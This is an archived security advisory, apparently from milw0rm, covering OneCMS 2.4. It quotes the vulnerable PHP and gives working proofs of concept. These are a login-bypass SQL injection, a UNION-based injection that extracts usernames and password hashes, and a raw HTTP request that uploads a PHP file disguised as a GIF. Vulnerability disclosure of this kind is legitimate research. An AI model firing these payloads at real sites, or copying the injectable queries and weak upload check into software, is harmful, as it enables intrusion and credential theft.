@@ -1,0 +1,110 @@
+########################## WwW.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: OneCMS Vulnerabilities
+# Vendor: http://www.insanevisions.com
+# Bugs: SQL Injection (Authentication bypass) , Arbitrary file upload!
+# Vulnerable Version: 2.4 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix Available: No!
+################################################################
+
+
+####################
+- Description:
+####################
+
+quote from vendor: "OneCMS is an Open Source CMS also released under GPL allowing users to run there own game site easily.
+ From the powerful template system to top-notch support, OneCMS is a great option for gaming sites."
+
+
+####################
+- Vulnerability:
+####################
+
++-->Multiple SQL Injection vulnerabilities (authentication bypass)
+
+Code Snippet:
+a_login.php Line#5-12
+
+if ($_GET['login'] == "yes") {
+
+$usernameb = strip_tags(stripcslashes($_POST['username']));
+$passwordc = $_POST['password']; 
+$passwordb = md5($passwordc);
+
+$sql = mysql_query("SELECT * FROM onecms_users WHERE username = '".$usernameb."' AND password = '".$passwordb."'");
+$login_check = mysql_num_rows($sql);
+
+$usernameb is prone to sql injection vulnerability therefore its possible for a remote attacker to bypass login form regardless of magic quotes setting!
+
+POC :
+Username: admin' or 1=1 /*
+Password: something
+
+afterward program redirects user to another location via header() and so (this behavior makes an infinite loop condition) but still its possible to do administration tasks such as file upload!
+
+------------------------------------
+Code Snippet:
+staff.php Line#30-31
+
+$result = mysql_query("SELECT * FROM onecms_profile WHERE username = '".$_GET['user']."'");
+$profile = mysql_fetch_row($result);
+
+POC:
+http://localhost/OneCMS_v2.4/staff.php?user=aaa' union select 1,username,password,1,1,1,1,1,1,1,1,1,1 from onecms_users/*
+condition: magic_quotes_gpc = Off
+
++--> Arbitrary file upload!
+
+Code Snippet:
+a_upload.php Line#472-475
+
+if ($_FILES["ss_$i"]["name"]) {
+if (((((($_FILES["ss_$i"]["type"] == "image/jpeg") or ($_FILES["ss_$i"]["type"] == "image/gif") or ($_FILES["ss_$i"]["type"] == "image/bmp") or ($_FILES["ss_$i"]["type"] == "image/png") && ($_FILES["ss_$i"]["type"])))))) {
+
+copy ($_FILES["ss_$i"]["tmp_name"], "$path/".$_FILES["ss_$i"]["name"]."");
+
+As shown above Its possible to upload arbitrary files (ex: .php) with image/gif content type as a valid image file! 
+
+POC:
+POST /OneCMS_v2.4/a_upload.php?view=add2 HTTP/1.0
+Cookie: username=admin'or 1=1/*; password=96e79218965eb72c92a549dd5a330112; login_date=1199693273; style=Trend
+
+-----------------------------7d84115025c
+Content-Disposition: form-data; name="ss_1"; filename="C:\path\to\file\test.php"
+Content-Type: image/gif
+
+<?
+phpinfo();
+?>
+-----------------------------7d84115025c
+Content-Disposition: form-data; name="ss2_1"
+
+
+-----------------------------7d84115025c
+Content-Disposition: form-data; name="type_1"
+
+image
+-----------------------------7d84115025c
+Content-Disposition: form-data; name="muche"
+
+1
+-----------------------------7d84115025c
+Content-Disposition: form-data; name="Submit"
+
+Upload
+-----------------------------7d84115025c--
+
+
+####################
+- Credit :
+####################
+Original Advisory: http://www.bugreport.ir/?/26
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-01-07]
